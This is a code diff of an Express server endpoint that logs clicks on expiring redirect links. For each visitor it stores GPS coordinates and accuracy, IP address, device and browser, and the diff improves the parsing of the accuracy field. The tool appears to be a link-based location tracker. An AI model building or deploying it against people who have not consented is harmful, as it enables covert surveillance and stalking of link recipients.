@@ -244,54 +244,99 @@ app.get('/api/hits/:id', async (req, res) => {
 });
 
 // In your server.js, improve the hit endpoint logging
+// ── TRACKING ENDPOINT - FIXED VERSION ──────────────────────────────────────────
 app.post('/api/hit/:id', hitLimiter, async (req, res) => {
   try {
-    if (!isValidId(req.params.id)) return res.status(400).json({ error:'invalid' });
+    if (!isValidId(req.params.id)) return res.status(400).json({ error: 'invalid' });
     const link = await Link.findById(req.params.id).select('expiresAt dest').lean();
-    if (!link) return res.status(404).json({ error:'not found' });
-    if (new Date(link.expiresAt)<new Date()) return res.status(410).json({ error:'expired' });
+    if (!link) return res.status(404).json({ error: 'not found' });
+    if (new Date(link.expiresAt) < new Date()) return res.status(410).json({ error: 'expired' });
 
+    // FIXED: Better extraction of accuracy from request body
     let { lat, lon, acc } = req.body;
     
-    // Better null/undefined handling
-    const hasValidLat = lat !== null && lat !== undefined && !isNaN(parseFloat(lat));
-    const hasValidLon = lon !== null && lon !== undefined && !isNaN(parseFloat(lon));
+    // DEBUG: Log what we received
+    console.log('📥 Raw request body:', JSON.stringify(req.body));
     
-    lat = hasValidLat ? parseFloat(lat) : null;
-    lon = hasValidLon ? parseFloat(lon) : null;
-    acc = (acc !== null && acc !== undefined && !isNaN(parseInt(acc))) ? parseInt(acc) : null;
+    // Extract accuracy properly - handle different possible formats
+    let accuracyValue = null;
     
-    // Validate ranges
-    if (lat !== null && (lat < -90 || lat > 90)) lat = null;
-    if (lon !== null && (lon < -180 || lon > 180)) lon = null;
-
-    const ua = req.headers['user-agent']||'';
-    let device='Unknown';
-    if      (/iPhone/.test(ua))    device='iPhone';
-    else if (/iPad/.test(ua))      device='iPad';
-    else if (/Android/.test(ua))   device='Android';
-    else if (/Windows/.test(ua))   device='Windows PC';
-    else if (/Macintosh/.test(ua)) device='Mac';
-    else if (/Linux/.test(ua))     device='Linux';
-
-    let browser='Unknown';
-    if      (/Edg\//.test(ua))     browser='Edge';
-    else if (/OPR\//.test(ua))     browser='Opera';
-    else if (/Chrome\//.test(ua))  browser='Chrome';
-    else if (/Firefox\//.test(ua)) browser='Firefox';
-    else if (/Safari\//.test(ua))  browser='Safari';
-
-    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress||'';
+    // Check various possible field names for accuracy
+    if (acc !== undefined && acc !== null) {
+      accuracyValue = acc;
+    } else if (req.body.accuracy !== undefined && req.body.accuracy !== null) {
+      accuracyValue = req.body.accuracy;
+    } else if (req.body.acc !== undefined && req.body.acc !== null) {
+      accuracyValue = req.body.acc;
+    }
     
-    // Enhanced logging
-    const locationStatus = (lat && lon) ? `SUCCESS (${lat},${lon})` : 'FAILED (null,null)';
-    console.log(`[HIT] ${req.params.id} → ${locationStatus} | ${device}/${browser} | ${ip} | Acc:${acc || 'N/A'}m`);
+    // Parse latitude
+    let latitude = null;
+    if (lat !== undefined && lat !== null && !isNaN(parseFloat(lat))) {
+      latitude = parseFloat(lat);
+      if (latitude < -90 || latitude > 90) latitude = null;
+    }
     
-    await Link.findByIdAndUpdate(req.params.id, { $push:{ hits:{ lat,lon,acc,device,browser,ip,time:new Date() } } });
-    res.json({ dest:link.dest });
-  } catch(e) { 
-    console.error('Hit error:', e); 
-    res.status(500).json({ error:'error' }); 
+    // Parse longitude
+    let longitude = null;
+    if (lon !== undefined && lon !== null && !isNaN(parseFloat(lon))) {
+      longitude = parseFloat(lon);
+      if (longitude < -180 || longitude > 180) longitude = null;
+    }
+    
+    // Parse accuracy - ensure it's a number
+    let finalAccuracy = null;
+    if (accuracyValue !== null && !isNaN(parseFloat(accuracyValue))) {
+      finalAccuracy = Math.round(parseFloat(accuracyValue));
+      if (finalAccuracy < 0) finalAccuracy = null;
+    }
+    
+    // Device detection
+    const ua = req.headers['user-agent'] || '';
+    let device = 'Unknown';
+    if (/iPhone/.test(ua)) device = 'iPhone';
+    else if (/iPad/.test(ua)) device = 'iPad';
+    else if (/Android/.test(ua)) device = 'Android';
+    else if (/Windows/.test(ua)) device = 'Windows PC';
+    else if (/Macintosh/.test(ua)) device = 'Mac';
+    else if (/Linux/.test(ua)) device = 'Linux';
+    
+    // Browser detection
+    let browser = 'Unknown';
+    if (/Edg\//.test(ua)) browser = 'Edge';
+    else if (/OPR\//.test(ua)) browser = 'Opera';
+    else if (/Chrome\//.test(ua)) browser = 'Chrome';
+    else if (/Firefox\//.test(ua)) browser = 'Firefox';
+    else if (/Safari\//.test(ua)) browser = 'Safari';
+    
+    // IP address
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
+    
+    // Enhanced logging with accuracy
+    const locationStatus = (latitude && longitude) ? `SUCCESS (${latitude},${longitude})` : 'FAILED (null,null)';
+    console.log(`[HIT] ${req.params.id} → ${locationStatus} | ${device}/${browser} | ${ip} | Accuracy: ${finalAccuracy ? finalAccuracy + 'm' : 'N/A'}`);
+    
+    // Save to database with accuracy
+    await Link.findByIdAndUpdate(req.params.id, {
+      $push: {
+        hits: {
+          lat: latitude,
+          lon: longitude,
+          acc: finalAccuracy,  // This is where accuracy is stored!
+          device: device,
+          browser: browser,
+          ip: ip,
+          time: new Date()
+        }
+      }
+    });
+    
+    // Send response with destination URL
+    res.json({ dest: link.dest });
+    
+  } catch (e) {
+    console.error('❌ Hit error:', e);
+    res.status(500).json({ error: 'error' });
   }
 });
 
